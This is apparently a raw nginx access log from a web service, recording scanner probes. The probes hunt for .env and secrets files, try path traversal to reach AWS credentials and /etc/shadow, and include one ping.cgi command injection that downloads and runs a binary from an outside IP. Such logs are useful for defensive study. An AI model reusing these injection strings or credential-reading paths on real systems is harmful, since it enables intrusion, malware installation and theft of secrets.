+2026-04-08T23:47:07.886682792Z vcs_nginx.0.or25x4imhgxv@vcs-vm-us1    | 10.0.0.2 - - [08/Apr/2026:23:47:07 +0000] "GET / HTTP/1.1" 200 423 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36" "-"
+2026-04-08T23:53:47.597547097Z vcs_nginx.0.or25x4imhgxv@vcs-vm-us1    | 10.0.0.2 - - [08/Apr/2026:23:53:47 +0000] "GET / HTTP/1.0" 200 423 "-" "Mozilla/5.0 (Linux; Android 6.0; CAM-L23) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.89 Mobile Safari/537.36" "-"
+2026-04-08T23:53:53.454758687Z vcs_nginx.0.or25x4imhgxv@vcs-vm-us1    | 2026/04/08 23:53:53 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
+2026-04-08T23:53:53.454842937Z vcs_nginx.0.or25x4imhgxv@vcs-vm-us1    | 2026/04/08 23:53:53 [notice] 8#8: gracefully shutting down
+2026-04-08T23:53:53.454850357Z vcs_nginx.0.or25x4imhgxv@vcs-vm-us1    | 2026/04/08 23:53:53 [notice] 8#8: exiting
+2026-04-08T23:53:53.454855407Z vcs_nginx.0.or25x4imhgxv@vcs-vm-us1    | 2026/04/08 23:53:53 [notice] 9#9: gracefully shutting down
+2026-04-08T23:53:53.454860178Z vcs_nginx.0.or25x4imhgxv@vcs-vm-us1    | 2026/04/08 23:53:53 [notice] 9#9: exiting
+2026-04-08T23:53:53.476259946Z vcs_nginx.0.or25x4imhgxv@vcs-vm-us1    | 2026/04/08 23:53:53 [notice] 8#8: exit
+2026-04-08T23:53:53.476293695Z vcs_nginx.0.or25x4imhgxv@vcs-vm-us1    | 2026/04/08 23:53:53 [notice] 9#9: exit
+2026-04-08T23:53:53.487219075Z vcs_nginx.0.or25x4imhgxv@vcs-vm-us1    | 2026/04/08 23:53:53 [notice] 1#1: signal 17 (SIGCHLD) received from 8
+2026-04-08T23:53:53.487288695Z vcs_nginx.0.or25x4imhgxv@vcs-vm-us1    | 2026/04/08 23:53:53 [notice] 1#1: worker process 8 exited with code 0
+2026-04-08T23:53:53.487296365Z vcs_nginx.0.or25x4imhgxv@vcs-vm-us1    | 2026/04/08 23:53:53 [notice] 1#1: signal 29 (SIGIO) received
+2026-04-08T23:53:53.487302305Z vcs_nginx.0.or25x4imhgxv@vcs-vm-us1    | 2026/04/08 23:53:53 [notice] 1#1: signal 17 (SIGCHLD) received from 9
+2026-04-08T23:53:53.487356115Z vcs_nginx.0.or25x4imhgxv@vcs-vm-us1    | 2026/04/08 23:53:53 [notice] 1#1: worker process 9 exited with code 0
+2026-04-08T23:53:53.487362375Z vcs_nginx.0.or25x4imhgxv@vcs-vm-us1    | 2026/04/08 23:53:53 [notice] 1#1: exit
+2026-04-08T20:18:20.548008185Z vcs_nginx.0.s7j5s7z0j3rr@vcs-vm-us1    | 10.0.0.2 - - [08/Apr/2026:20:18:20 +0000] "GET /.env.development HTTP/1.1" 200 423 "-" "Mozilla/5.0 (iPhone; U; CPU iPhone OS) (compatible; Googlebot-Mobile/2.1;  http://www.google.com/bot.html)" "-"
+2026-04-08T20:18:20.872475462Z vcs_nginx.0.s7j5s7z0j3rr@vcs-vm-us1    | 10.0.0.2 - - [08/Apr/2026:20:18:20 +0000] "GET /apis/.env HTTP/1.1" 200 423 "-" "Mozilla/5.0 (Windows NT 6.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.109 Safari/537.36" "-"
+2026-04-08T20:18:21.068660967Z vcs_nginx.0.s7j5s7z0j3rr@vcs-vm-us1    | 10.0.0.2 - - [08/Apr/2026:20:18:21 +0000] "GET /local/.env HTTP/1.1" 200 423 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; InfoPath.1; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)" "-"
+2026-04-08T20:18:21.264733163Z vcs_nginx.0.s7j5s7z0j3rr@vcs-vm-us1    | 10.0.0.2 - - [08/Apr/2026:20:18:21 +0000] "GET /project/.env HTTP/1.1" 200 423 "-" "Mozilla/5.0 (iPad; CPU OS 8_0_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML like Gecko) Mobile/12A405 Version/7.0 Safari/9537.53" "-"
+2026-04-08T20:18:21.486575106Z vcs_nginx.0.s7j5s7z0j3rr@vcs-vm-us1    | 10.0.0.2 - - [08/Apr/2026:20:18:21 +0000] "GET /.env.local HTTP/1.1" 200 423 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/530.5 (KHTML, like Gecko) Chrome/2.0.172.43 Safari/530.5" "-"
+2026-04-08T20:18:21.680184283Z vcs_nginx.0.s7j5s7z0j3rr@vcs-vm-us1    | 10.0.0.2 - - [08/Apr/2026:20:18:21 +0000] "GET /back/.env HTTP/1.1" 200 423 "-" "Mozilla/5.0 (Linux; U; Android 4.2.2; tr-tr; Vodafone Smart Tab 4 Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.2 Mobile Safari/534.30 SVN/040FTG1" "-"
+2026-04-08T20:18:21.936861225Z vcs_nginx.0.s7j5s7z0j3rr@vcs-vm-us1    | 10.0.0.2 - - [08/Apr/2026:20:18:21 +0000] "GET /cms/.env HTTP/1.1" 200 423 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36" "-"
+2026-04-08T20:18:22.157076919Z vcs_nginx.0.s7j5s7z0j3rr@vcs-vm-us1    | 10.0.0.2 - - [08/Apr/2026:20:18:22 +0000] "GET /index.php?file=../../../../../../../../root/.aws/credentials HTTP/1.1" 200 423 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98) Opera 7.23  [en]" "-"
+2026-04-08T20:18:22.352572704Z vcs_nginx.0.s7j5s7z0j3rr@vcs-vm-us1    | 10.0.0.2 - - [08/Apr/2026:20:18:22 +0000] "GET /settings.py HTTP/1.1" 200 423 "-" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_4; fr-FR) AppleWebKit/533.4 (KHTML, like Gecko) Chrome/5.0.375.126 Safari/533.4" "-"
+2026-04-08T20:18:22.566848619Z vcs_nginx.0.s7j5s7z0j3rr@vcs-vm-us1    | 10.0.0.2 - - [08/Apr/2026:20:18:22 +0000] "GET /application.yml HTTP/1.1" 200 423 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:14.0) Gecko/20100101 Firefox/14.0.1" "-"
+2026-04-08T20:18:22.780129353Z vcs_nginx.0.s7j5s7z0j3rr@vcs-vm-us1    | 10.0.0.2 - - [08/Apr/2026:20:18:22 +0000] "GET /web.config HTTP/1.1" 200 423 "-" "Mozilla/5.0 (Windows NT 5.1; rv:26.0) Gecko/20100101 Firefox/26.0" "-"
+2026-04-08T20:18:22.979630829Z vcs_nginx.0.s7j5s7z0j3rr@vcs-vm-us1    | 10.0.0.2 - - [08/Apr/2026:20:18:22 +0000] "GET /config.js HTTP/1.1" 200 423 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10.5; en-US; rv:1.9.0.3) Gecko/2008092414 Firefox/3.0.3" "-"
+2026-04-08T20:18:23.183599415Z vcs_nginx.0.s7j5s7z0j3rr@vcs-vm-us1    | 10.0.0.2 - - [08/Apr/2026:20:18:23 +0000] "GET /database.js HTTP/1.1" 200 423 "-" "Mozilla/5.0 (Linux; U; Android 4.3; es-us; GT-I9300 Build/JSS15J) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30" "-"
+2026-04-08T20:18:23.378733510Z vcs_nginx.0.s7j5s7z0j3rr@vcs-vm-us1    | 10.0.0.2 - - [08/Apr/2026:20:18:23 +0000] "GET /secrets.json HTTP/1.1" 200 423 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; Tablet PC 2.0; .NET4.0C; .NET4.0E; EIE10;ENUSWOL)" "-"
+2026-04-08T20:18:23.618733503Z vcs_nginx.0.s7j5s7z0j3rr@vcs-vm-us1    | 10.0.0.2 - - [08/Apr/2026:20:18:23 +0000] "GET /bootstrap.yml HTTP/1.1" 200 423 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 OPR/45.0.2552.898" "-"
+2026-04-08T20:18:23.813696049Z vcs_nginx.0.s7j5s7z0j3rr@vcs-vm-us1    | 10.0.0.2 - - [08/Apr/2026:20:18:23 +0000] "GET /hibernate.cfg.xml HTTP/1.1" 200 423 "-" "Mozilla/5.0 (X11; U; Linux i686; es-ES; rv:1.9.1.9) Gecko/20100317 SUSE/3.5.9-0.1 Firefox/3.5.9" "-"
+2026-04-08T20:18:24.010421125Z vcs_nginx.0.s7j5s7z0j3rr@vcs-vm-us1    | 10.0.0.2 - - [08/Apr/2026:20:18:24 +0000] "GET /config.toml HTTP/1.1" 200 423 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.2; WOW64; Trident/7.0; .NET4.0E; .NET4.0C; .NET CLR 3.5.30729; .NET CLR 2.0.50727; .NET CLR 3.0.30729; GWX:RESERVED)" "-"
+2026-04-08T20:18:24.439549414Z vcs_nginx.0.s7j5s7z0j3rr@vcs-vm-us1    | 10.0.0.2 - - [08/Apr/2026:20:18:24 +0000] "GET /config.json HTTP/1.1" 200 423 "-" "Mozilla/5.0 (OS/2; Warp 4.5; rv:45.0) Gecko/20100101 Firefox/45.0" "-"
+2026-04-08T20:18:24.634131070Z vcs_nginx.0.s7j5s7z0j3rr@vcs-vm-us1    | 10.0.0.2 - - [08/Apr/2026:20:18:24 +0000] "GET /appsettings.json HTTP/1.1" 200 423 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; MASP; rv:11.0) like Gecko" "-"
+2026-04-08T20:18:24.870037333Z vcs_nginx.0.s7j5s7z0j3rr@vcs-vm-us1    | 10.0.0.2 - - [08/Apr/2026:20:18:24 +0000] "GET /appsettings.Development.json HTTP/1.1" 200 423 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.87 Safari/537.36" "-"
+2026-04-08T20:18:25.082575877Z vcs_nginx.0.s7j5s7z0j3rr@vcs-vm-us1    | 10.0.0.2 - - [08/Apr/2026:20:18:25 +0000] "GET /config/database.yml HTTP/1.1" 200 423 "-" "Mozilla/5.0 (X11; U; Linux i686; fr; rv:1.8) Gecko/20060110 Debian/1.5.dfsg-4 Firefox/1.5" "-"
+2026-04-08T20:18:25.326348930Z vcs_nginx.0.s7j5s7z0j3rr@vcs-vm-us1    | 10.0.0.2 - - [08/Apr/2026:20:18:25 +0000] "GET /config/secrets.yml HTTP/1.1" 200 423 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/533.21.1 (KHTML, like Gecko) Version/5.0.5 Safari/533.21.1" "-"
+2026-04-08T20:18:25.520893495Z vcs_nginx.0.s7j5s7z0j3rr@vcs-vm-us1    | 10.0.0.2 - - [08/Apr/2026:20:18:25 +0000] "GET /static//etc/passwd HTTP/1.1" 200 423 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; es-ES; rv:1.8.1.14) Gecko/20080404 Firefox/2.0.0.13" "-"
+2026-04-08T20:18:25.715999521Z vcs_nginx.0.s7j5s7z0j3rr@vcs-vm-us1    | 10.0.0.2 - - [08/Apr/2026:20:18:25 +0000] "GET /static//etc/shadow HTTP/1.1" 200 423 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36" "-"
+2026-04-08T20:18:25.914754446Z vcs_nginx.0.s7j5s7z0j3rr@vcs-vm-us1    | 10.0.0.2 - - [08/Apr/2026:20:18:25 +0000] "GET /static//etc/hostname HTTP/1.1" 200 423 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1)" "-"
+2026-04-08T20:18:26.124524151Z vcs_nginx.0.s7j5s7z0j3rr@vcs-vm-us1    | 10.0.0.2 - - [08/Apr/2026:20:18:26 +0000] "GET /static//proc/self/environ HTTP/1.1" 200 423 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; MDDSJS)" "-"
+2026-04-08T20:18:26.351569025Z vcs_nginx.0.s7j5s7z0j3rr@vcs-vm-us1    | 10.0.0.2 - - [08/Apr/2026:20:18:26 +0000] "GET /static//proc/self/cmdline HTTP/1.1" 200 423 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; pl) Opera 8.54" "-"
+2026-04-08T20:18:26.629113994Z vcs_nginx.0.s7j5s7z0j3rr@vcs-vm-us1    | 10.0.0.2 - - [08/Apr/2026:20:18:26 +0000] "GET /static//home/user/.aws/credentials HTTP/1.1" 200 423 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36 OPR/30.0.1835.88 (Edition RMV)" "-"
+2026-04-08T20:31:46.243572467Z vcs_nginx.0.s7j5s7z0j3rr@vcs-vm-us1    | 10.0.0.2 - - [08/Apr/2026:20:31:46 +0000] "\x16\x03\x03\x01\xA7\x01\x00\x01\xA3\x03\x03:\xCC\x0B%1\xBF\x90L\xC3%\xB80\xB0\x88\xDD\x9E1\xF9\xFF\x93\xF4&\xF8\xAC\xD3/\xF3$\xA4\xDC\x1E\xCB \xF3]\xC6N\xD8w\xF3\x9B\x14" 400 157 "-" "-" "-"
+2026-04-08T20:31:49.337367286Z vcs_nginx.0.s7j5s7z0j3rr@vcs-vm-us1    | 10.0.0.2 - - [08/Apr/2026:20:31:49 +0000] "GET / HTTP/1.1" 200 423 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:134.0) Gecko/20100101 Firefox/134.0" "-"
+2026-04-08T20:34:34.069463420Z vcs_nginx.0.s7j5s7z0j3rr@vcs-vm-us1    | 10.0.0.2 - - [08/Apr/2026:20:34:34 +0000] "GET /favicon.ico HTTP/1.1" 200 423 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:134.0) Gecko/20100101 Firefox/134.0" "-"
+2026-04-08T20:49:59.161505161Z vcs_nginx.0.s7j5s7z0j3rr@vcs-vm-us1    | 10.0.0.2 - - [08/Apr/2026:20:49:59 +0000] "GET /ping.cgi?pingIpAddress=google.fr;wget%20http://37.48.254.120/arm7%20-O%20/tmp/arm7;chmod%20777%20/tmp/arm7;/tmp/arm7%27/&sessionKey=1039 HTTP/1.1" 400 157 "-" "r00ts3c" "-"
+2026-04-08T20:52:56.476963691Z vcs_nginx.0.s7j5s7z0j3rr@vcs-vm-us1    | 10.0.0.2 - - [08/Apr/2026:20:52:56 +0000] "\x16\x03\x01\x00\xCA\x01\x00\x00\xC6\x03\x03\xEF\xEB$r\xB1\xD0\xA5\xC7d:De\xDA\xBA|\x0B\xFC\xD5\x0E\xD5s\xC9\x97o|\x10=Z|;n\xB2\x00\x00h\xCC\x14\xCC\x13\xC0/\xC0+\xC00\xC0,\xC0\x11\xC0\x07\xC0'\xC0#\xC0\x13\xC0\x09\xC0(\xC0$\xC0\x14\xC0" 400 157 "-" "-" "-"
+2026-04-08T20:52:56.478645180Z vcs_nginx.0.s7j5s7z0j3rr@vcs-vm-us1    | 10.0.0.2 - - [08/Apr/2026:20:52:56 +0000] "\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03`|.\x12\xC4\xAB\xE1d\x0E\xD4I\x9B\xF2<\xF7\xA5\x1C\x85>V\x9F/<b\x14\xCE\x1F[\x93`E\x1E L\x9A3\x10{\x98\xCE\xF9\x90\x8CLlb\x19\xAAQL\xA6]\x9D\xAB\xBB\x15\x1D\xCD\xA6$3\x06QGM\x00&\xC0+\xC0/\xC0,\xC00\xCC\xA9\xCC\xA8\xC0\x09\xC0\x13\xC0" 400 157 "-" "-" "-"
+2026-04-08T21:08:10.500616681Z vcs_nginx.0.s7j5s7z0j3rr@vcs-vm-us1    | 10.0.0.2 - - [08/Apr/2026:21:08:10 +0000] "\x16\x03\x01\x01g\x01\x00\x01c\x03\x03\x01{R'\x9C7\xEB`$.\xFC\x1Dp\xE1\x05{y\x9D\xBE\xF0\x92" 400 157 "-" "-" "-"
+2026-04-08T21:08:11.784713064Z vcs_nginx.0.s7j5s7z0j3rr@vcs-vm-us1    | 10.0.0.2 - - [08/Apr/2026:21:08:11 +0000] "\x16\x03\x01\x01g\x01\x00\x01c\x03\x03>\xF3\xDC\x07k\x07\xA3\x91\xF6\xC0\x04A\x5C\x8C\xE7\xD7r']\xADg}\xE9b\x8CGg\xC17\xDCeJ `\xD9hIDA7a\x93\xBE\xD7r~\x10\xE3\x15}-\x00\x81\xDCN\x18\x9Fw\x8B\x86\x08\x8A\x07\x06q\x00v\x13\x02\x13\x03\x13\x01\xC0/\xC0+\xC00\xC0,\x00\x9E\xC0'\x00g\xC0(\x00k\x00\xA3\x00\x9F\xCC\xA9\xCC\xA8\xCC\xAA\xC0\xAF\xC0\xAD\xC0\xA3\xC0\x9F\xC0]\xC0a\xC0W\xC0S\x00\xA2\xC0\xAE\xC0\xAC\xC0\xA2\xC0\x9E\xC0\x5C\xC0`\xC0V\xC0R\xC0$\x00j\xC0#\x00@\xC0" 400 157 "-" "-" "-"
+2026-04-08T21:08:11.902694586Z vcs_nginx.0.s7j5s7z0j3rr@vcs-vm-us1    | 10.0.0.2 - - [08/Apr/2026:21:08:11 +0000] "\x16\x03\x01\x01g\x01\x00\x01c\x03\x03\x8B>*\x8FeNy\xA6\x84\xC6\xADL\xB7D\x05Kq\x02y\x99\xAEE\x17\x98\x89\xC6\x0Bp}\x9E\x01\xEF \xF6\xFFN\xE21D\xE4\x01W\xDE\xC7\x87\x1F\x1A\xB2\xA4\xDA\xDC\xDF\x10\x0E\xC8\xF1jGMh0\xDBY\x87\xE4\x00v\x13\x02\x13\x03\x13\x01\xC0/\xC0+\xC00\xC0,\x00\x9E\xC0'\x00g\xC0(\x00k\x00\xA3\x00\x9F\xCC\xA9\xCC\xA8\xCC\xAA\xC0\xAF\xC0\xAD\xC0\xA3\xC0\x9F\xC0]\xC0a\xC0W\xC0S\x00\xA2\xC0\xAE\xC0\xAC\xC0\xA2\xC0\x9E\xC0\x5C\xC0`\xC0V\xC0R\xC0$\x00j\xC0#\x00@\xC0" 400 157 "-" "-" "-"
+2026-04-08T21:08:24.730898784Z vcs_nginx.0.s7j5s7z0j3rr@vcs-vm-us1    | 10.0.0.2 - - [08/Apr/2026:21:08:24 +0000] "\x16\x03\x01\x01g\x01\x00\x01c\x03\x03\xFA\xC02\xF5\x15\x0FE\x97`[}\xEC\xCE\xAE" 400 157 "-" "-" "-"
+2026-04-08T21:08:24.832295416Z vcs_nginx.0.s7j5s7z0j3rr@vcs-vm-us1    | 10.0.0.2 - - [08/Apr/2026:21:08:24 +0000] "\x16\x03\x01\x01g\x01\x00\x01c\x03\x03b\xB6\xA5\x12\x12_\x831\xB6+\xDA\xD2\xAC\x97\xC7\xDD\xE8\x89H Y;)7\x98\x02\xCD\x1F\x5C\x81\x5C< N\xAE+\xED\xD2\x18\x81\x89\xFD\xD7I&\x9F\x86\xB6" 400 157 "-" "-" "-"
+2026-04-08T21:08:24.889450282Z vcs_nginx.0.s7j5s7z0j3rr@vcs-vm-us1    | 10.0.0.2 - - [08/Apr/2026:21:08:24 +0000] "\x16\x03\x01\x01g\x01\x00\x01c\x03\x03t\xC1\xFBMf!\xDD\xB3\x17\x85Z\xCE\x86\x16\x89\xB7;\xAF@\xC7/\xD4\x87B\x9F\x99\xDE\x12s\x85\xD6> P\x04\xB4@U\xA9\xD0`\x8C+Iu\xC0\x1B\x8F\xAF\xE1\xB3\x9CT\xAF\x9Cym\x89`\xD8\xB8\xF5Sg\x06\x00v\x13\x02\x13\x03\x13\x01\xC0/\xC0+\xC00\xC0,\x00\x9E\xC0'\x00g\xC0(\x00k\x00\xA3\x00\x9F\xCC\xA9\xCC\xA8\xCC\xAA\xC0\xAF\xC0\xAD\xC0\xA3\xC0\x9F\xC0]\xC0a\xC0W\xC0S\x00\xA2\xC0\xAE\xC0\xAC\xC0\xA2\xC0\x9E\xC0\x5C\xC0`\xC0V\xC0R\xC0$\x00j\xC0#\x00@\xC0" 400 157 "-" "-" "-"
+2026-04-08T21:08:33.983741916Z vcs_nginx.0.s7j5s7z0j3rr@vcs-vm-us1    | 10.0.0.2 - - [08/Apr/2026:21:08:33 +0000] "\x16\x03\x01\x01g\x01\x00\x01c\x03\x03\x0B\x8C\xEF\xF2\xBE\xDB\xFE\xA8z\xEAx\xBC\x92\xC8\x8DM\xDE\x99]L\xE6\xD6h[#\x12\x22\xDE\x15\x9E\xCE\xE6 \xC2\x96R{N\x00\xA3|\x8A\x7FG\xF2\xF2@\x8E\x80\x9F\x82\x91\xEB2*\x02p\x8B9\x15 \xDB9\xF3M\x00v\x13\x02\x13\x03\x13\x01\xC0/\xC0+\xC00\xC0,\x00\x9E\xC0'\x00g\xC0(\x00k\x00\xA3\x00\x9F\xCC\xA9\xCC\xA8\xCC\xAA\xC0\xAF\xC0\xAD\xC0\xA3\xC0\x9F\xC0]\xC0a\xC0W\xC0S\x00\xA2\xC0\xAE\xC0\xAC\xC0\xA2\xC0\x9E\xC0\x5C\xC0`\xC0V\xC0R\xC0$\x00j\xC0#\x00@\xC0" 400 157 "-" "-" "-"
+2026-04-08T21:08:34.108140497Z vcs_nginx.0.s7j5s7z0j3rr@vcs-vm-us1    | 10.0.0.2 - - [08/Apr/2026:21:08:34 +0000] "\x16\x03\x01\x01g\x01\x00\x01c\x03\x03<\x86\xF2W\x10\x01\xA5\xD1\xC9\xA0x\xE3\x7Fo\x86\xA9\xF5.\xE76\x96\x16*:\x1A\xC9[\xE8ww)\xDD 2\xF4\x12q\x10(v\x8B\x19\xF2\xFE\xD7\x1C`-l\xA4U\x19\x8A'\xB8b\x22Ud\xF3\x82\xEF\xE0]\xCC\x00v\x13\x02\x13\x03\x13\x01\xC0/\xC0+\xC00\xC0,\x00\x9E\xC0'\x00g\xC0(\x00k\x00\xA3\x00\x9F\xCC\xA9\xCC\xA8\xCC\xAA\xC0\xAF\xC0\xAD\xC0\xA3\xC0\x9F\xC0]\xC0a\xC0W\xC0S\x00\xA2\xC0\xAE\xC0\xAC\xC0\xA2\xC0\x9E\xC0\x5C\xC0`\xC0V\xC0R\xC0$\x00j\xC0#\x00@\xC0" 400 157 "-" "-" "-"
+2026-04-08T21:08:41.324337082Z vcs_nginx.0.s7j5s7z0j3rr@vcs-vm-us1    | 10.0.0.2 - - [08/Apr/2026:21:08:41 +0000] "GET / HTTP/1.1" 200 423 "-" "Umai-Scanner/1.0 (+https://umai.entelijan.com/methodology)" "-"
+2026-04-08T21:08:41.784842157Z vcs_nginx.0.s7j5s7z0j3rr@vcs-vm-us1    | 10.0.0.2 - - [08/Apr/2026:21:08:41 +0000] "GET /api/tags HTTP/1.1" 200 423 "-" "Umai-Scanner/1.0 (+https://umai.entelijan.com/methodology)" "-"
+2026-04-08T21:08:41.787333827Z vcs_nginx.0.s7j5s7z0j3rr@vcs-vm-us1    | 10.0.0.2 - - [08/Apr/2026:21:08:41 +0000] "GET /v1/models HTTP/1.1" 200 423 "-" "Umai-Scanner/1.0 (+https://umai.entelijan.com/methodology)" "-"
+2026-04-08T21:08:49.965598680Z vcs_nginx.0.s7j5s7z0j3rr@vcs-vm-us1    | 10.0.0.2 - - [08/Apr/2026:21:08:49 +0000] "GET /api/version HTTP/1.1" 200 423 "-" "Umai-Scanner/1.0 (+https://umai.entelijan.com/methodology)" "-"
+2026-04-08T21:08:51.764278993Z vcs_nginx.0.s7j5s7z0j3rr@vcs-vm-us1    | 10.0.0.2 - - [08/Apr/2026:21:08:51 +0000] "GET /.well-known/mcp.json HTTP/1.1" 200 423 "-" "Umai-Scanner/1.0 (+https://umai.entelijan.com/methodology)" "-"
+2026-04-08T21:08:54.932477614Z vcs_nginx.0.s7j5s7z0j3rr@vcs-vm-us1    | 10.0.0.2 - - [08/Apr/2026:21:08:54 +0000] "GET /.well-known/agent.json HTTP/1.1" 200 423 "-" "Umai-Scanner/1.0 (+https://umai.entelijan.com/methodology)" "-"
+2026-04-08T21:08:55.071113043Z vcs_nginx.0.s7j5s7z0j3rr@vcs-vm-us1    | 10.0.0.2 - - [08/Apr/2026:21:08:55 +0000] "GET /queue/status HTTP/1.1" 200 423 "-" "Umai-Scanner/1.0 (+https://umai.entelijan.com/methodology)" "-"
+2026-04-08T21:08:55.090722422Z vcs_nginx.0.s7j5s7z0j3rr@vcs-vm-us1    | 10.0.0.2 - - [08/Apr/2026:21:08:55 +0000] "GET /metrics HTTP/1.1" 200 423 "-" "Umai-Scanner/1.0 (+https://umai.entelijan.com/methodology)" "-"
+2026-04-08T21:18:36.471302473Z vcs_nginx.0.s7j5s7z0j3rr@vcs-vm-us1    | 10.0.0.2 - - [08/Apr/2026:21:18:36 +0000] "GET / HTTP/1.0" 200 423 "-" "Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; +https://www.nokia.com/genomecrawler)" "-"
+2026-04-08T21:19:41.533874812Z vcs_nginx.0.s7j5s7z0j3rr@vcs-vm-us1    | 10.0.0.2 - - [08/Apr/2026:21:19:41 +0000] "GET / HTTP/1.0" 200 423 "-" "Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; +https://www.nokia.com/genomecrawler)" "-"
+2026-04-08T21:20:28.594553191Z vcs_nginx.0.s7j5s7z0j3rr@vcs-vm-us1    | 10.0.0.2 - - [08/Apr/2026:21:20:28 +0000] "\x16\x03\x01\x00\xFD\x01\x00\x00\xF9\x03\x031\x96\x8D\x221ki/zm\xE7\x97\xB3Z!j\x16\xFC)j\x98kn\xEA\x02\xB6r\xC84\xEFC~ ;\x88r\xC8\x1B\xCC\x9E'\xA1g`\xDB\x89H/v\xBA\xF4y#\x19g\x90#Bz\x06S\x92\xCF\xA0\x1F\x00&\xCC\xA8\xCC\xA9\xC0/\xC00\xC0+\xC0,\xC0\x13\xC0\x09\xC0\x14\xC0" 400 157 "-" "-" "-"
+2026-04-08T21:27:31.049850761Z vcs_nginx.0.s7j5s7z0j3rr@vcs-vm-us1    | 10.0.0.2 - - [08/Apr/2026:21:27:31 +0000] "GET / HTTP/1.1" 200 423 "-" "Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; +https://www.nokia.com/genomecrawler)" "-"
+2026-04-08T21:27:34.440983977Z vcs_nginx.0.s7j5s7z0j3rr@vcs-vm-us1    | 10.0.0.2 - - [08/Apr/2026:21:27:34 +0000] "GET /manage/account/login HTTP/1.1" 200 423 "-" "Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; +https://www.nokia.com/genomecrawler)" "-"
+2026-04-08T21:27:37.203232371Z vcs_nginx.0.s7j5s7z0j3rr@vcs-vm-us1    | 10.0.0.2 - - [08/Apr/2026:21:27:37 +0000] "GET /admin/index.html HTTP/1.1" 200 423 "-" "Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; +https://www.nokia.com/genomecrawler)" "-"
+2026-04-08T21:27:39.045888822Z vcs_nginx.0.s7j5s7z0j3rr@vcs-vm-us1    | 10.0.0.2 - - [08/Apr/2026:21:27:39 +0000] "GET /index.html HTTP/1.1" 200 423 "-" "Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; +https://www.nokia.com/genomecrawler)" "-"
+2026-04-08T21:27:41.757079368Z vcs_nginx.0.s7j5s7z0j3rr@vcs-vm-us1    | 10.0.0.2 - - [08/Apr/2026:21:27:41 +0000] "GET /+CSCOE+/logon.html HTTP/1.1" 200 423 "-" "Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; +https://www.nokia.com/genomecrawler)" "-"
+2026-04-08T21:27:44.288042138Z vcs_nginx.0.s7j5s7z0j3rr@vcs-vm-us1    | 10.0.0.2 - - [08/Apr/2026:21:27:44 +0000] "GET /cgi-bin/login.cgi HTTP/1.1" 200 423 "-" "Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; +https://www.nokia.com/genomecrawler)" "-"
+2026-04-08T21:27:44.464774645Z vcs_nginx.0.s7j5s7z0j3rr@vcs-vm-us1    | 10.0.0.2 - - [08/Apr/2026:21:27:44 +0000] "GET /login.htm HTTP/1.1" 200 423 "-" "Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; +https://www.nokia.com/genomecrawler)" "-"
+2026-04-08T21:27:45.777470216Z vcs_nginx.0.s7j5s7z0j3rr@vcs-vm-us1    | 10.0.0.2 - - [08/Apr/2026:21:27:45 +0000] "GET /login.html HTTP/1.1" 200 423 "-" "Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; +https://www.nokia.com/genomecrawler)" "-"
+2026-04-08T21:32:41.834961449Z vcs_nginx.0.s7j5s7z0j3rr@vcs-vm-us1    | 10.0.0.2 - - [08/Apr/2026:21:32:41 +0000] "GET / HTTP/1.1" 200 423 "-" "Mozilla/5.0 zgrab/0.x" "-"
